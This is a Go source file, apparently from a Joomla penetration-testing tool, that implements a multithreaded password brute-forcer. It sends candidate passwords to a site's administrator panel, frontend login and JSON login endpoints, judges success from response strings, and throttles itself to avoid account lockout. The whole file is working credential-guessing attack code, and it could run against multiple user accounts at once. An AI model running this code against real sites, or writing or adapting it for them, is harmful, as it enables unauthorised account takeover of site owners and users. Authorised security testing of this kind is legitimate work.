package bruteforce

import (
	"crypto/md5"
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/lfgrillo83/joomhound/internal/http"
	"github.com/lfgrillo83/joomhound/internal/models"
)

type PasswordBruteforcer struct {
	client         *http.Client
	threads        int
	maxRetries     int
	delayBetween   time.Duration
	backoffFactor  float64
}

func NewPasswordBruteforcer(client *http.Client, threads int) *PasswordBruteforcer {
	if threads <= 0 {
		threads = 5 // Lower default for password attacks to avoid lockout
	}
	return &PasswordBruteforcer{
		client:        client,
		threads:       threads,
		maxRetries:    3,
		delayBetween:  time.Second,
		backoffFactor: 2.0,
	}
}

// BruteForcePassword attempts to crack a user's password
func (pb *PasswordBruteforcer) BruteForcePassword(
	targetURL string,
	username string,
	passwords []string,
) *models.User {
	result := &models.User{
		Username:      username,
		PasswordValid: false,
	}

	var mu sync.Mutex
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, pb.threads)
	done := make(chan bool)

	attempt := 0
	for _, password := range passwords {
		// Check if we already found a valid password
		select {
		case <-done:
			return result
		default:
		}

		wg.Add(1)
		go func(pass string, attemptNum int) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			// Exponential backoff after multiple attempts
			if attemptNum > 0 && attemptNum%10 == 0 {
				delay := pb.delayBetween
				for i := 1; i < (attemptNum / 10); i++ {
					delay = time.Duration(float64(delay) * pb.backoffFactor)
				}
				time.Sleep(delay)
			}

			if pb.tryPassword(targetURL, username, pass) {
				mu.Lock()
				result.Password = pass
				result.PasswordValid = true
				mu.Unlock()
				close(done)
			}
		}(password, attempt)
		attempt++
	}

	wg.Wait()
	return result
}

// BruteForceMultipleUsers attempts password brute-force on multiple users
func (pb *PasswordBruteforcer) BruteForceMultipleUsers(
	targetURL string,
	users []string,
	passwords []string,
) []models.User {
	var results []models.User
	var mu sync.Mutex
	var wg sync.WaitGroup

	userSemaphore := make(chan struct{}, 2) // Max 2 users at a time

	for _, user := range users {
		wg.Add(1)
		go func(username string) {
			defer wg.Done()
			userSemaphore <- struct{}{}
			defer func() { <-userSemaphore }()

			result := pb.BruteForcePassword(targetURL, username, passwords)
			mu.Lock()
			results = append(results, *result)
			mu.Unlock()
		}(user)
	}

	wg.Wait()
	return results
}

// tryPassword attempts a single login
func (pb *PasswordBruteforcer) tryPassword(targetURL string, username string, password string) bool {
	// Try multiple login methods
	methods := []func(string, string, string) bool{
		pb.tryViaAdminPanel,
		pb.tryViaFrontend,
		pb.tryViaJSON,
	}

	for _, method := range methods {
		if method(targetURL, username, password) {
			return true
		}
	}
	return false
}

// tryViaAdminPanel attempts login via administrator panel
func (pb *PasswordBruteforcer) tryViaAdminPanel(targetURL string, username string, password string) bool {
	adminURL := targetURL + "/administrator/"

	// Get the page first to extract any CSRF tokens
	resp, err := pb.client.Get(adminURL)
	if err != nil || resp.StatusCode != 200 {
		return false
	}

	// Extract return parameter if available
	returnURL := ""
	if strings.Contains(resp.String(), "return=") {
		// Could extract this from HTML, for now use empty
	}

	// Prepare login data
	loginData := url.Values{
		"username": {username},
		"passwd":   {password},
		"option":   {"com_login"},
		"task":     {"login"},
		"return":   {returnURL},
	}.Encode()

	resp, err = pb.client.Post(
		adminURL,
		[]byte(loginData),
		"application/x-www-form-urlencoded",
	)

	if err != nil || resp.StatusCode != 200 {
		return false
	}

	content := resp.String()

	// Check for successful login indicators
	successIndicators := []string{
		"welcome",
		"control panel",
		"Home",
		"Administrator",
		"Dashboard",
	}

	// Check for error indicators that mean login failed
	errorIndicators := []string{
		"Invalid username or password",
		"Authentication Failed",
		"Access denied",
		"You do not have access to the Administration",
	}

	hasError := false
	for _, indicator := range errorIndicators {
		if strings.Contains(content, indicator) {
			hasError = true
			break
		}
	}

	if hasError {
		return false
	}

	// Check for success indicators
	for _, indicator := range successIndicators {
		if strings.Contains(content, indicator) {
			return true
		}
	}

	return false
}

// tryViaFrontend attempts login via frontend /index.php?Itemid=...
func (pb *PasswordBruteforcer) tryViaFrontend(targetURL string, username string, password string) bool {
	// Frontend login endpoint
	loginURL := targetURL + "/index.php"

	loginData := url.Values{
		"username": {username},
		"passwd":   {password},
		"option":   {"com_login"},
		"task":     {"user.login"},
		"Itemid":   {"101"}, // Common Itemid for login
	}.Encode()

	resp, err := pb.client.Post(
		loginURL,
		[]byte(loginData),
		"application/x-www-form-urlencoded",
	)

	if err != nil || resp.StatusCode != 200 {
		return false
	}

	content := resp.String()

	// Frontend login success usually redirects and shows "logout" or user profile
	return strings.Contains(content, "logout") ||
		strings.Contains(content, "user profile") ||
		strings.Contains(content, "My Profile")
}

// tryViaJSON attempts login via JSON API (Joomla 3.2+)
func (pb *PasswordBruteforcer) tryViaJSON(targetURL string, username string, password string) bool {
	jsonLoginURL := targetURL + "/index.php?option=com_users&task=user.login&format=json"

	loginData := url.Values{
		"username": {username},
		"passwd":   {password},
	}.Encode()

	resp, err := pb.client.Post(
		jsonLoginURL,
		[]byte(loginData),
		"application/x-www-form-urlencoded",
	)

	if err != nil || resp.StatusCode != 200 {
		return false
	}

	var jsonResp map[string]interface{}
	if err := json.Unmarshal(resp.Body, &jsonResp); err != nil {
		return false
	}

	// Check for success token
	if token, ok := jsonResp["token"]; ok && token != "" {
		return true
	}

	// Check for error
	if message, ok := jsonResp["message"]; ok {
		msgStr := fmt.Sprintf("%v", message)
		if strings.Contains(msgStr, "Invalid") || strings.Contains(msgStr, "failed") {
			return false
		}
	}

	return false
}

// MD5Hash generates MD5 hash (used in some Joomla password schemes)
func (pb *PasswordBruteforcer) MD5Hash(password string) string {
	return fmt.Sprintf("%x", md5.Sum([]byte(password)))
}

// SetDelayBetweenAttempts sets the delay between password attempts
func (pb *PasswordBruteforcer) SetDelayBetweenAttempts(delay time.Duration) {
	pb.delayBetween = delay
}
